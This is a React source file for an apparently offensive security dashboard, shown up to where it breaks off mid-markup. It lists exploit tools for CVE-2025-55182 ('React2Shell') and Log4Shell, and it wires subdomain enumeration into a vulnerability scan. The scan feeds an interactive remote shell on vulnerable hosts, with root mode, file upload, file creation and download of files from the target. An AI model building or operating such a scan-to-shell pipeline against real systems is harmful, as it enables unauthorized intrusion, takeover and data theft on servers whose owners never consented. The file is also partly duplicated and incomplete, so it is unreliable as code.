import React, { useState, useRef, useCallback, useEffect } from 'react'
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query'
import {
  Zap, Terminal, Search, Globe, ChevronRight, CheckCircle,
  XCircle, Loader, Copy, Download, Upload, Wifi, WifiOff, Square,
  AlertTriangle, Skull, Radio, FileText, FilePlus, FolderOpen,
  X, Play, Database, Save, Shield, BarChart3, Clock,
  RefreshCw, Cpu, Lock, ChevronDown, Activity, Filter,
  Eye, EyeOff, Target, Info, Server
} from 'lucide-react'
import toast from 'react-hot-toast'
import { api } from '../lib/api'

// ── Tool registry ─────────────────────────────────────────────
const TOOLS = [
  {
    id: 'react2shell',
    name: 'React2Shell',
    cve: 'CVE-2025-55182',
    desc: 'Next.js Server Actions RCE via prototype pollution in multipart form. Supports subdomain enum, vuln scan, interactive shell, file upload/download/create.',
    author: 'Master Ramdan',
    severity: 'critical',
    tags: ['RCE', 'Next.js', 'Node.js', 'PoC'],
  },
  {
    id: 'scan_engine',
    name: 'Scan Engine',
    cve: null,
    desc: 'Modular security scan engine. Port scan, web vuln, SSL/TLS, DNS, security headers, subdomain recon, CVE matching via NVD feed.',
    author: 'OffenSecOps',
    severity: 'info',
    tags: ['Port Scan', 'Nuclei', 'CVE', 'OWASP'],
  },
  {
    id: 'wpscan',
    name: 'WPScan',
    cve: null,
    desc: 'Auto-detect WordPress & scan for vulnerable plugins, themes, users, and misconfigs. Supports WPScan API token for vulnerability data.',
    author: 'OffenSecOps',
    severity: 'high',
    tags: ['WordPress', 'CMS', 'Plugins', 'CVE'],
  },
  {
    id: 'log4shell',
    name: 'Log4Shell',
    cve: 'CVE-2021-44228',
    desc: 'Detect & exploit Log4Shell (CVE-2021-44228) via JNDI injection across 60+ templates. Supports bulk scan from subdomain recon results.',
    author: 'OffenSecOps',
    severity: 'critical',
    tags: ['Log4j', 'JNDI', 'RCE', 'CVE-2021-44228'],
  },
  {
    id: 'sherlock',
    name: 'Sherlock',
    cve: null,
    desc: 'Hunt down social media accounts by username across 400+ social networks. OSINT username reconnaissance.',
    author: 'sherlock-project',
    severity: 'medium',
    tags: ['OSINT', 'Username', 'Social Media', 'Recon'],
  },
  {
    id: 'sqli',
    name: 'SQLi Testing',
    cve: null,
    desc: 'Manual & automated SQL Injection testing. Supports error-based, blind, time-based, and union-based injection techniques.',
    author: 'OffenSecOps',
    severity: 'critical',
    tags: ['SQLi', 'Injection', 'OWASP', 'Database'],
  },
]

// ── Terminal ──────────────────────────────────────────────────
type LineType = 'cmd' | 'out' | 'err' | 'info' | 'success' | 'warn'
interface Line { type: LineType; text: string }

const LINE_COLOR: Record<LineType, string> = {
  cmd:     'text-yellow-300',
  out:     'text-green-300',
  err:     'text-red-400',
  info:    'text-cyan-400',
  success: 'text-emerald-300 font-bold',
  warn:    'text-yellow-500',
}

function Terminal_({ lines, loading }: { lines: Line[], loading?: boolean }) {
  const endRef = useRef<HTMLDivElement>(null)
  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [lines, loading])
  return (
    <div className="flex-1 overflow-y-auto p-4 font-mono text-xs leading-5 space-y-px min-h-0" style={{ background: '#060a0f' }}>
      {lines.length === 0 && !loading && (
        <span className="text-gray-700 italic">// waiting for input...</span>
      )}
      {lines.map((l, i) => (
        <div key={i} className={LINE_COLOR[l.type]}>
          {l.type === 'cmd' && <span className="text-gray-600 select-none">❯ </span>}
          <span style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{l.text}</span>
        </div>
      ))}
      {loading && (
        <div className="flex items-center gap-2 text-cyan-400">
          <Loader size={11} className="animate-spin" />
          <span className="animate-pulse">executing...</span>
        </div>
      )}
      <div ref={endRef} />
    </div>
  )
}

// ── React2Shell ───────────────────────────────────────────────
function React2ShellModule({ onSwitchTool }: { onSwitchTool?: (tool: string) => void }) {
  const [tab, setTab] = useState<'scanner'|'shell'>('scanner')

  // Scanner state
  const [domain, setDomain] = useState('')
  const [manualTargets, setManualTargets] = useState('')
  const [scanLines, setScanLines] = useState<Line[]>([])
  const [scanning, setScanning] = useState(false)
  const [foundSubdomains, setFoundSubdomains] = useState<any[]>([])
  const [selectedWordlist, setSelectedWordlist] = useState('builtin')
  const [scanProgress, setScanProgress] = useState({ scanned: 0, total: 0, found: 0 })
  const cancelRef = useRef<(() => void) | null>(null)
  const [osintSources, setOsintSources] = useState<Record<string, {status:string, count?:number, reason?:string}>>({})
  const [savingToTargets, setSavingToTargets] = useState(false)
  const [saveGroupId, setSaveGroupId] = useState('')
  const [showSaveModal, setShowSaveModal] = useState(false)

  const { data: targetGroups = [] } = useQuery({
    queryKey: ['target-groups'],
    queryFn: () => api.get('/targets/groups').then(r => r.data),
    retry: false,
    staleTime: 30000,
  })

  const { data: wordlists = [] } = useQuery({
    queryKey: ['wordlists'],
    queryFn: () => api.get('/advanced-tools/react2shell/wordlists').then(r => r.data),
    staleTime: 60000,
  })
  const [vulnResults, setVulnResults] = useState<any[]>([])

  // Shell state
  const [targetUrl, setTargetUrl] = useState('')
  const [shellEndpoint, setShellEndpoint] = useState('')
  const [connected, setConnected] = useState(false)
  const [currentDir, setCurrentDir] = useState<string | null>(null)
  const [rootMode, setRootMode] = useState(false)
  const [shellCmd, setShellCmd] = useState('')
  const [cmdHistory, setCmdHistory] = useState<string[]>([])
  const [histIdx, setHistIdx] = useState(-1)
  const [shellLines, setShellLines] = useState<Line[]>([])
  const [execLoading, setExecLoading] = useState(false)

  // File ops state
  const [fileModal, setFileModal] = useState<'upload'|'download'|'create'|null>(null)
  const [fileCreatePath, setFileCreatePath] = useState('')
  const [fileCreateContent, setFileCreateContent] = useState('')
  const [fileDownloadPath, setFileDownloadPath] = useState('')
  const [fileOpLoading, setFileOpLoading] = useState(false)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const shellInputRef = useRef<HTMLInputElement>(null)

  const addScan = (type: LineType, text: string) => setScanLines(l => [...l, { type, text }])
  const addShell = (type: LineType, text: string) => setShellLines(l => [...l, { type, text }])

  // ── Subdomain scan — SSE streaming ──────────────────────────
  const runSubdomainScan = () => {
    if (!domain) return
    if (cancelRef.current) { cancelRef.current(); cancelRef.current = null }

    setScanning(true)
    setScanLines([])
    setFoundSubdomains([])
    setScanProgress({ scanned: 0, total: 0, found: 0 })
    setOsintSources({})

    const wl = wordlists.find((w: any) => w.name === selectedWordlist)
    addScan('info', `[*] Subdomain enumeration — ${domain}`)
    addScan('info', `[*] Wordlist : ${wl?.label || selectedWordlist}`)
    addScan('info', `[*] Method   : HTTP/HTTPS concurrent`)
    addScan('info', '')

    // Get token dari localStorage
    let accessToken = ''
    try {
      const raw = localStorage.getItem('offensecops-auth') || '{}'
      accessToken = JSON.parse(raw)?.state?.accessToken || ''
    } catch {}

    const params = new URLSearchParams({ domain, wordlist: selectedWordlist, timeout: '5' })
    const controller = new AbortController()
    cancelRef.current = () => controller.abort()
    const foundLocal: any[] = []

    fetch(`/api/advanced-tools/react2shell/subdomain-scan-stream?${params}`, {
      headers: { Authorization: `Bearer ${accessToken}` },
      signal: controller.signal,
    })
      .then(async (res) => {
        const reader = res.body?.getReader()
        if (!reader) throw new Error('No response body')
        const decoder = new TextDecoder()
        let buf = ''

        while (true) {
          const { done, value } = await reader.read()
          if (done) break
          buf += decoder.decode(value, { stream: true })
          const lines = buf.split('\n')
          buf = lines.pop() || ''

          for (const line of lines) {
            if (!line.startsWith('data: ')) continue
            try {
              const d = JSON.parse(line.slice(6))

              if (d.type === 'osint_start') {
                addScan('info', `[*] Mode         : OSINT Passive Recon`)
                addScan('info', `[*] Sources      : crt.sh, Wayback, VirusTotal*, SecurityTrails*, Censys*`)
                addScan('info', `[*] (* = requires API key)`)
                addScan('info', '')

              } else if (d.type === 'osint_source') {
                setOsintSources(prev => ({ ...prev, [d.source]: { status: d.status, count: d.count, reason: d.reason } }))
                if (d.status === 'running') {
                  addScan('info', `[*] ${d.source.padEnd(16)} querying...`)
                } else if (d.status === 'done') {
                  addScan('success', `[+] ${d.source.padEnd(16)} ${d.count} subdomain(s)`)
                } else if (d.status === 'skipped') {
                  addScan('warn', `[~] ${d.source.padEnd(16)} skipped (${d.reason})`)
                }

              } else if (d.type === 'start') {
                addScan('info', `[*] Total entries : ${d.total.toLocaleString()}`)
                addScan('info', '')
                setScanProgress({ scanned: 0, total: d.total, found: 0 })

              } else if (d.type === 'found') {
                foundLocal.push(d.item)
                setFoundSubdomains([...foundLocal])
                addScan('success', `[+] ${d.item.url}  [HTTP ${d.item.status}]`)
                setScanProgress({ scanned: d.scanned, total: d.total, found: foundLocal.length })

              } else if (d.type === 'progress') {
                setScanProgress({ scanned: d.scanned, total: d.total, found: foundLocal.length })

              } else if (d.type === 'done') {
                addScan('info', '')
                if (foundLocal.length === 0) {
                  addScan('err', '[-] No subdomains found')
                } else {
                  addScan('success', `[=] Done — ${foundLocal.length} subdomain(s) found`)
                }
                addScan('info', `[=] Scanned ${d.scanned.toLocaleString()}/${d.total.toLocaleString()} entries`)
                setScanning(false)
                cancelRef.current = null

              } else if (d.type === 'cancelled') {
                addScan('warn', `[!] Cancelled — ${foundLocal.length} result(s) preserved`)
                addScan('warn', `[!] Scanned ${d.scanned.toLocaleString()} entries before stop`)
                setScanning(false)
                cancelRef.current = null
              }
            } catch {}
          }
        }
      })
      .catch((e) => {
        if (e.name === 'AbortError') {
          addScan('warn', '')
          addScan('warn', `[!] Scan stopped — ${foundLocal.length} result(s) preserved`)
        } else {
          addScan('err', `[-] Error: ${e.message}`)
        }
        setScanning(false)
        cancelRef.current = null
      })
  }

  const cancelScan = () => {
    if (cancelRef.current) { cancelRef.current(); cancelRef.current = null }
  }

  // ── Save subdomain results to Targets ────────────────────────
  const saveToTargets = async () => {
    if (foundSubdomains.length === 0) return
    setSavingToTargets(true)
    addScan('info', '')
    addScan('info', `[*] Saving ${foundSubdomains.length} subdomain(s) to Targets...`)

    const payload = foundSubdomains.map((s: any) => ({
      value: s.url || s.full_domain || String(s),
      type: 'subdomain',
      tags: ['recon', 'react2shell'],
      source: 'react2shell',
    }))

    try {
      const res = await api.post('/targets/bulk', {
        targets: payload,
        group_id: saveGroupId || null,
        criticality: 'medium',
        scope_status: 'in_scope',
      })
      const d = res.data
      addScan('success', `[+] Saved ${d.created} new target(s) to database`)
      if (d.skipped > 0) addScan('info', `[~] ${d.skipped} already existed — skipped`)
      toast.success(`${d.created} subdomain saved to Targets!`)
    } catch (e: any) {
      addScan('err', `[-] Failed to save: ${e.message}`)
      toast.error('Failed to save to Targets')
    } finally {
      setSavingToTargets(false)
    }
  }

  // ── Vuln scan ───────────────────────────────────────────────
  const runVulnScan = async () => {
    const targets = foundSubdomains.length > 0
      ? foundSubdomains.map((s: any) => s.url)
      : manualTargets.split('\n').map(s => s.trim()).filter(Boolean)

    if (targets.length === 0) { toast.error('Masukkan target dulu'); return }

    setScanning(true)
    addScan('info', `\n[*] Scanning ${targets.length} target(s) for CVE-2025-55182...`)
    addScan('info', `[*] Testing ${6} endpoints per target`)
    addScan('info', '')

    try {
      const res = await api.post('/advanced-tools/react2shell/vuln-scan', { targets, timeout: 15 })
      const data = res.data
      data.results.forEach((r: any) => {
        if (r.vulnerable) {
          addScan('success', `[VULNERABLE] ${r.target}`)
          if (r.working_endpoint !== r.target) addScan('info', `    └─ Endpoint: ${r.working_endpoint}`)
        } else {
          addScan('err', `[NOT VULNERABLE] ${r.target}`)
        }
      })
      addScan('info', `\n[=] ${data.total_vulnerable}/${data.total_scanned} vulnerable`)
      const vuln = data.results.filter((r: any) => r.vulnerable)
      setVulnResults(vuln)
      if (vuln.length > 0) toast.success(`${vuln.length} target vulnerable!`)
    } catch (e: any) {
      addScan('err', `[-] Scan error: ${e.message}`)
    } finally {
      setScanning(false)
    }
  }

  // ── Shell connect ───────────────────────────────────────────
  const connectShell = async () => {
    if (!targetUrl) return
    setExecLoading(true)
    setShellLines([])
    addShell('info', `[*] Testing connection to ${targetUrl}...`)
    try {
      const res = await api.post('/advanced-tools/react2shell/test-connection', { target_url: targetUrl, timeout: 10 })
      const data = res.data
      if (!data.reachable) { addShell('err', '[-] Target unreachable'); return }
      if (!data.vulnerable) { addShell('err', '[-] Target not vulnerable to CVE-2025-55182'); return }

      setConnected(true)
      setShellEndpoint(data.working_endpoint)
      addShell('success', `[+] Target is VULNERABLE!`)
      addShell('info', `[+] Working endpoint: ${data.working_endpoint}`)
      addShell('info', '[*] Initializing shell...')
      await execDirect('pwd', data.working_endpoint)
      await execDirect('id', data.working_endpoint)
    } catch (e: any) {
      addShell('err', `[-] ${e.message}`)
    } finally {
      setExecLoading(false)
    }
  }

  const execDirect = async (cmd: string, endpoint?: string, silent = true) => {
    const ep = endpoint || shellEndpoint
    const res = await api.post('/advanced-tools/react2shell/exec', {
      target_url: ep,
      command: cmd,
      current_dir: null,
      root_mode: rootMode,
      timeout: 15,
    })
    if (!silent && res.data.output) addShell('out', res.data.output)
    if (res.data.new_dir) setCurrentDir(res.data.new_dir)
    else if (cmd === 'pwd' && res.data.output?.includes('/')) {
      const d = res.data.output.trim().split('\n')[0]
      if (d.startsWith('/')) setCurrentDir(d)
    }
    return res.data
  }

  const execCmd = useCallback(async (rawCmd: string) => {
    const cmd = rawCmd.trim()
    if (!cmd) return

    // Special commands
    if (cmd === '.exit') { setConnected(false); setCurrentDir(null); addShell('info', '[*] Session ended'); return }
    if (cmd === '.root') {
      const nr = !rootMode
      setRootMode(nr)
      addShell('info', `[*] Root mode ${nr ? 'ENABLED ⚡' : 'DISABLED'}`)
      return
    }
    if (cmd === '.clear') { setShellLines([]); return }
    if (cmd === '.help') {
      addShell('info', [
        '', '  Shell Commands:',
        '  .root           Toggle sudo -i mode',
        '  .upload         Open file upload dialog',
        '  .download <path> Download file from target',
        '  .create <path>  Create new file on target',
        '  .exit           Close session',
        '  .clear          Clear terminal',
        '  .help           Show this help',
        '',
      ].join('\n'))
      return
    }
    if (cmd === '.upload') { setFileModal('upload'); return }
    if (cmd.startsWith('.download')) {
      const path = cmd.slice(9).trim()
      if (path) { setFileDownloadPath(path); setFileModal('download') }
      else setFileModal('download')
      return
    }
    if (cmd.startsWith('.create')) {
      const path = cmd.slice(7).trim()
      if (path) setFileCreatePath(path)
      setFileModal('create')
      return
    }

    addShell('cmd', cmd)
    setExecLoading(true)

    try {
      let finalCmd = cmd
      if (cmd.startsWith('cd ')) {
        const path = cmd.slice(3).trim()
        finalCmd = `cd ${path} && pwd`
      }

      const res = await api.post('/advanced-tools/react2shell/exec', {
        target_url: shellEndpoint,
        command: finalCmd,
        current_dir: cmd.startsWith('cd ') ? null : currentDir,
        root_mode: rootMode,
        timeout: 15,
      })

      if (cmd.startsWith('cd ') && res.data.new_dir) {
        setCurrentDir(res.data.new_dir)
      } else {
        if (res.data.output) addShell('out', res.data.output)
        if (res.data.new_dir) setCurrentDir(res.data.new_dir)
      }
    } catch (e: any) {
      addShell('err', `[-] ${e.message}`)
    } finally {
      setExecLoading(false)
    }
  }, [shellEndpoint, currentDir, rootMode])

  const handleShellKey = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      const cmd = shellCmd.trim()
      if (!cmd) return
      setCmdHistory(h => [cmd, ...h.slice(0, 99)])
      setHistIdx(-1)
      setShellCmd('')
      execCmd(cmd)
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      const idx = Math.min(histIdx + 1, cmdHistory.length - 1)
      setHistIdx(idx)
      setShellCmd(cmdHistory[idx] || '')
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      const idx = histIdx - 1
      if (idx < 0) { setHistIdx(-1); setShellCmd('') }
      else { setHistIdx(idx); setShellCmd(cmdHistory[idx] || '') }
    }
  }

  // ── File ops ────────────────────────────────────────────────
  const handleFileUpload = async (file: File) => {
    setFileOpLoading(true)
    addShell('info', `[*] Uploading ${file.name} (${(file.size/1024).toFixed(1)} KB)...`)
    try {
      const ab = await file.arrayBuffer()
      const b64 = btoa(String.fromCharCode(...new Uint8Array(ab)))
      const remotePath = `/tmp/${file.name}`
      const res = await api.post('/advanced-tools/react2shell/upload', {
        target_url: shellEndpoint,
        remote_path: remotePath,
        file_content_b64: b64,
        timeout: 60,
      })
      if (res.data.success) {
        addShell('success', `[+] Uploaded to ${remotePath}`)
        addShell('out', res.data.verify_output)
        toast.success('Upload successful!')
      } else {
        addShell('err', `[-] Upload failed: ${res.data.error}`)
      }
    } catch (e: any) {
      addShell('err', `[-] Upload error: ${e.message}`)
    } finally {
      setFileOpLoading(false)
      setFileModal(null)
    }
  }

  const handleFileDownload = async () => {
    if (!fileDownloadPath) return
    setFileOpLoading(true)
    addShell('info', `[*] Downloading ${fileDownloadPath}...`)
    try {
      const res = await api.post('/advanced-tools/react2shell/download', {
        target_url: shellEndpoint,
        remote_path: fileDownloadPath,
        current_dir: currentDir,
        timeout: 30,
      })
      if (res.data.success) {
        const bytes = atob(res.data.file_content_b64)
        const arr = new Uint8Array(bytes.length)
        for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i)
        const blob = new Blob([arr])
        const a = document.createElement('a')
        a.href = URL.createObjectURL(blob)
        a.download = fileDownloadPath.split('/').pop() || 'download'
        a.click()
        addShell('success', `[+] Downloaded ${fileDownloadPath} (${res.data.file_size} bytes)`)
        toast.success(`Downloaded ${(res.data.file_size/1024).toFixed(1)} KB`)
      } else {
        addShell('err', `[-] Download failed: ${res.data.error}`)
      }
    } catch (e: any) {
      addShell('err', `[-] ${e.message}`)
    } finally {
      setFileOpLoading(false)
      setFileModal(null)
      setFileDownloadPath('')
    }
  }

  const handleFileCreate = async () => {
    if (!fileCreatePath || !fileCreateContent) return
    setFileOpLoading(true)
    addShell('info', `[*] Creating ${fileCreatePath}...`)
    try {
      const res = await api.post('/advanced-tools/react2shell/create-file', {
        target_url: shellEndpoint,
        remote_path: fileCreatePath,
        content: fileCreateContent,
        current_dir: currentDir,
        timeout: 15,
      })
      if (res.data.success) {
        addShell('success', `[+] File created: ${fileCreatePath}`)
        addShell('out', res.data.verify_output)
        toast.success('File created!')
      } else {
        addShell('err', `[-] Failed to create file`)
      }
    } catch (e: any) {
      addShell('err', `[-] ${e.message}`)
    } finally {
      setFileOpLoading(false)
      setFileModal(null)
      setFileCreatePath('')
      setFileCreateContent('')
    }
  }

  const copyLines = (lines: Line[]) => {
    navigator.clipboard.writeText(lines.map(l => l.text).join('\n'))
    toast.success('Copied')
  }

  const scanTargets = foundSubdomains.length > 0
    ? foundSubdomains.map(s => s.url)
    : manualTargets.split('\n').map(s => s.trim()).filter(Boolean)

  return (
    <div className="flex gap-4 h-full min-h-0">
      {/* ── Save to Targets Modal ─────────────────────────── */}
      {showSaveModal && (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-4">
          <div className="bg-bg-secondary border border-border-default rounded-xl w-full max-w-sm">
            <div className="flex items-center justify-between p-5 border-b border-border-default">
              <h2 className="font-display font-bold text-text-primary flex items-center gap-2">
                <Save size={16} className="text-severity-low" /> Save to Targets
              </h2>
              <button onClick={() => setShowSaveModal(false)} className="text-text-muted hover:text-text-primary"><X size={16} /></button>
            </div>
            <div className="p-5 space-y-4">
              <p className="text-sm text-text-secondary font-mono">
                <span className="text-accent-primary font-bold">{foundSubdomains.length}</span> subdomain akan disimpan.
                IP address di-resolve otomatis.
              </p>
              <div>
                <label className="label-field mb-2">Masukan ke Group (opsional)</label>
                <select value={saveGroupId} onChange={e => setSaveGroupId(e.target.value)} className="input-field text-sm">
                  <option value="">— No Group —</option>
                  {(targetGroups as any[]).map((g: any) => (
                    <option key={g.id} value={g.id}>{g.name}</option>
                  ))}
                </select>
              </div>
            </div>
            <div className="flex gap-3 p-5 border-t border-border-default">
              <button onClick={() => setShowSaveModal(false)} className="btn-secondary flex-1">Cancel</button>
              <button
                onClick={() => { setShowSaveModal(false); saveToTargets() }}
                className="btn-primary flex-1 flex items-center justify-center gap-2 text-sm">
                <Save size={13} /> Save {foundSubdomains.length} Targets
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Left sidebar ────────────────────────────────────── */}
      <div className="w-72 flex-shrink-0 flex flex-col gap-3 overflow-y-auto">
        {/* Tab */}
        <div className="flex gap-1 p-1 bg-bg-tertiary rounded-lg border border-border-default">
          {(['scanner','shell'] as const).map(t => (
            <button key={t} onClick={() => setTab(t)}
              className={`flex-1 py-2 text-xs font-mono rounded transition-all capitalize ${
                tab === t ? 'bg-accent-primary bg-opacity-20 text-accent-primary' : 'text-text-muted hover:text-text-secondary'
              }`}>
              {t === 'scanner' ? <><Search size={11} className="inline mr-1" />Scanner</> : <><Terminal size={11} className="inline mr-1" />Shell</>}
            </button>
          ))}
        </div>

        {tab === 'scanner' && (
          <div className="card p-4 space-y-4">
            {/* Step 1 */}
            <div>
              <p className="text-xs font-mono text-accent-primary font-bold mb-2 flex items-center gap-1.5">
                <span className="w-4 h-4 rounded-full bg-accent-primary bg-opacity-20 text-accent-primary flex items-center justify-center text-xs">1</span>
                Subdomain Finder
              </p>
              <div className="flex gap-2">
                <input value={domain} onChange={e => setDomain(e.target.value)}
                  className="input-field flex-1 font-mono text-sm" placeholder="target.com"
                  onKeyDown={e => e.key === 'Enter' && runSubdomainScan()} />
                <button
                  onClick={scanning ? cancelScan : runSubdomainScan}
                  disabled={!domain && !scanning}
                  title={scanning ? 'Cancel scan' : 'Start scan'}
                  className={`px-3 font-mono text-xs transition-all ${scanning
                    ? 'rounded-lg border border-red-600 bg-red-900 bg-opacity-20 text-red-400 hover:bg-opacity-40'
                    : 'btn-primary'}`}>
                  {scanning ? <Square size={13} /> : <Search size={13} />}
                </button>
              </div>
              <div>
                <label className="label-field mb-1.5">Wordlist</label>
                <div className="grid grid-cols-2 gap-1">
                  {wordlists.map((wl: any) => (
                    <button key={wl.name} onClick={() => wl.available && setSelectedWordlist(wl.name)}
                      disabled={!wl.available}
                      className={`text-xs font-mono px-2 py-2 rounded border text-left transition-all relative ${
                        selectedWordlist === wl.name
                          ? wl.name === 'default'
                            ? 'border-purple-500 bg-purple-900 bg-opacity-20 text-purple-300'
                            : 'border-accent-primary bg-accent-primary bg-opacity-10 text-accent-primary'
                          : wl.available
                            ? 'border-border-default text-text-muted hover:border-border-muted'
                            : 'border-border-default text-text-muted opacity-30 cursor-not-allowed'
                      }`}>
                      <p className="capitalize font-bold flex items-center gap-1">
                        {wl.name === 'default' && <span className="text-purple-400">★</span>}
                        {wl.name}
                      </p>
                      <p className="text-text-muted" style={{fontSize:'10px'}}>
                        {wl.name === 'default'
                          ? 'OSINT passive'
                          : wl.available ? wl.label.match(/\(.*\)/)?.[0] || '' : 'unavailable'}
                      </p>
                    </button>
                  ))}
                  {wordlists.length === 0 && (
                    <div className="col-span-2 text-xs font-mono text-text-muted text-center py-2">
                      <Loader size={11} className="animate-spin inline mr-1" /> loading...
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* OSINT source status — hanya muncul saat mode default */}
            {selectedWordlist === 'default' && Object.keys(osintSources).length > 0 && (
              <div className="space-y-1 p-3 rounded-lg border border-border-default bg-bg-tertiary">
                <p className="text-xs font-mono text-text-muted mb-2">OSINT Sources</p>
                {['crt.sh','Wayback','VirusTotal','SecurityTrails','Censys'].map(src => {
                  const s = osintSources[src]
                  if (!s) return null
                  return (
                    <div key={src} className="flex items-center justify-between text-xs font-mono">
                      <span className="text-text-muted">{src}</span>
                      <span className={
                        s.status === 'done'    ? 'text-severity-low' :
                        s.status === 'running' ? 'text-accent-primary animate-pulse' :
                        s.status === 'skipped' ? 'text-text-muted opacity-50' :
                        'text-text-muted'
                      }>
                        {s.status === 'done'    ? `✓ ${s.count}` :
                         s.status === 'running' ? '⟳ ...' :
                         s.status === 'skipped' ? '— no key' : s.status}
                      </span>
                    </div>
                  )
                })}
              </div>
            )}

            {/* Progress bar */}
            {(scanning || scanProgress.total > 0) && (
              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono text-text-muted">
                    {scanning ? 'Scanning...' : 'Done'} {scanProgress.scanned.toLocaleString()}/{scanProgress.total.toLocaleString()}
                  </span>
                  <span className="text-xs font-mono text-severity-low font-bold">
                    {scanProgress.found} found
                  </span>
                </div>
                <div className="h-1.5 bg-bg-tertiary rounded-full overflow-hidden">
                  <div
                    className="h-full bg-accent-primary rounded-full transition-all duration-300"
                    style={{ width: scanProgress.total > 0 ? `${Math.min((scanProgress.scanned / scanProgress.total) * 100, 100)}%` : '0%' }}
                  />
                </div>
              </div>
            )}

            {/* OSINT source status — hanya muncul saat mode default */}
            {selectedWordlist === 'default' && Object.keys(osintSources).length > 0 && (
              <div className="space-y-1 p-3 rounded-lg border border-border-default bg-bg-tertiary">
                <p className="text-xs font-mono text-text-muted mb-2">OSINT Sources</p>
                {['crt.sh','Wayback','VirusTotal','SecurityTrails','Censys'].map(src => {
                  const s = osintSources[src]
                  if (!s) return null
                  return (
                    <div key={src} className="flex items-center justify-between text-xs font-mono">
                      <span className="text-text-muted">{src}</span>
                      <span className={
                        s.status === 'done'    ? 'text-severity-low' :
                        s.status === 'running' ? 'text-accent-primary animate-pulse' :
                        s.status === 'skipped' ? 'text-text-muted opacity-50' :
                        'text-text-muted'
                      }>
                        {s.status === 'done'    ? `✓ ${s.count}` :
                         s.status === 'running' ? '⟳ ...' :
                         s.status === 'skipped' ? '— no key' : s.status}
                      </span>
                    </div>
                  )
                })}
              </div>
            )}

            {/* Progress bar */}
            {scanProgress.total > 0 && (
              <div className="space-y-1.5 pt-1">
                <div className="flex items-center justify-between font-mono text-xs">
                  <span className="text-text-muted">
                    {scanning ? 'Scanning...' : 'Done'}&nbsp;
                    <span className="text-text-secondary">
                      {scanProgress.scanned.toLocaleString()}/{scanProgress.total.toLocaleString()}
                    </span>
                  </span>
                  <span className="text-severity-low font-bold">
                    {scanProgress.found} found
                  </span>
                </div>
                <div className="h-1.5 rounded-full overflow-hidden bg-bg-tertiary">
                  <div
                    className={`h-full rounded-full transition-all duration-200 ${scanning ? 'bg-accent-primary' : 'bg-severity-low'}`}
                    style={{ width: `${Math.min((scanProgress.scanned / scanProgress.total) * 100, 100)}%` }}
                  />
                </div>
              </div>
            )}

            {/* Step 2 */}
            <div>
              <p className="text-xs font-mono text-accent-primary font-bold mb-2 flex items-center gap-1.5">
                <span className="w-4 h-4 rounded-full bg-accent-primary bg-opacity-20 text-accent-primary flex items-center justify-center text-xs">2</span>
                Manual Targets
              </p>
              <textarea value={manualTargets} onChange={e => setManualTargets(e.target.value)}
                className="input-field h-24 resize-none font-mono text-xs"
                placeholder={"https://target1.com\nhttps://api.target.com\nhttp://10.10.10.10:3000"} />
            </div>

            {/* Step 3: Vuln scan */}
            <div>
              <p className="text-xs font-mono text-accent-primary font-bold mb-2 flex items-center gap-1.5">
                <span className="w-4 h-4 rounded-full bg-accent-primary bg-opacity-20 text-accent-primary flex items-center justify-center text-xs">3</span>
                Vuln Scan ({scanTargets.length} targets)
              </p>
              <button onClick={runVulnScan} disabled={scanning || scanTargets.length === 0}
                className="btn-primary w-full flex items-center justify-center gap-2 text-sm">
                {scanning ? <><Loader size={13} className="animate-spin" />Scanning...</> : <><Radio size={13} />Scan CVE-2025-55182</>}
              </button>
            </div>

            {/* Save to Targets */}
            {foundSubdomains.length > 0 && (
              <div>
                <p className="text-xs font-mono text-accent-primary font-bold mb-2 flex items-center gap-1.5">
                  <span className="w-4 h-4 rounded-full bg-accent-primary bg-opacity-20 text-accent-primary flex items-center justify-center text-xs">4</span>
                  Save Results ({foundSubdomains.length} subdomains)
                </p>
                <button
                  onClick={() => setShowSaveModal(true)}
                  disabled={savingToTargets || foundSubdomains.length === 0}
                  className="w-full flex items-center justify-center gap-2 text-sm font-mono py-2 rounded-lg border border-severity-low border-opacity-40 text-severity-low hover:bg-severity-low hover:bg-opacity-10 transition-all disabled:opacity-50">
                  {savingToTargets
                    ? <><Loader size={13} className="animate-spin" />Saving...</>
                    : <><Save size={13} />Save to Targets</>
                  }
                </button>
              </div>
            )}
            {/* Log4Shell scan */}
            {foundSubdomains.length > 0 && (
              <div>
                <p className="text-xs font-mono text-severity-critical font-bold mb-2 flex items-center gap-1.5">
                  <span className="w-4 h-4 rounded-full bg-severity-critical bg-opacity-20 text-severity-critical flex items-center justify-center text-xs">🔥</span>
                  Log4Shell Scanner
                </p>
                <button
                  onClick={() => {
                    const t = foundSubdomains.map((s: any) => s.url || `http://${s.subdomain || s}`)
                    localStorage.setItem("log4shell_targets", JSON.stringify(t))
                    window.dispatchEvent(new StorageEvent("storage", { key: "log4shell_targets", newValue: JSON.stringify(t) }))
                    onSwitchTool?.("log4shell")
                  }}
                  className="w-full flex items-center justify-center gap-2 text-sm font-mono py-2 rounded-lg border border-severity-critical border-opacity-40 text-severity-critical hover:bg-severity-critical hover:bg-opacity-10 transition-all">
                  🔥 Scan {foundSubdomains.length} Subdomains for Log4Shell
                </button>
              </div>
            )}

            {/* Vulnerable targets */}
            {vulnResults.length > 0 && (
              <div>
                <p className="text-xs font-mono text-severity-critical font-bold mb-2 flex items-center gap-1">
                  <AlertTriangle size={11} /> {vulnResults.length} VULNERABLE
                </p>
                <div className="space-y-1.5">
                  {vulnResults.map((v, i) => (
                    <button key={i}
                      onClick={() => { setTargetUrl(v.working_endpoint); setTab('shell') }}
                      className="w-full text-left p-2.5 rounded-lg border border-severity-critical border-opacity-40 bg-severity-critical bg-opacity-5 hover:bg-opacity-10 transition-colors">
                      <p className="text-xs font-mono text-severity-critical truncate">{v.working_endpoint}</p>
                      <p className="text-xs text-text-muted mt-0.5 flex items-center gap-1"><ChevronRight size={10} /> Open Shell</p>
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {tab === 'shell' && (
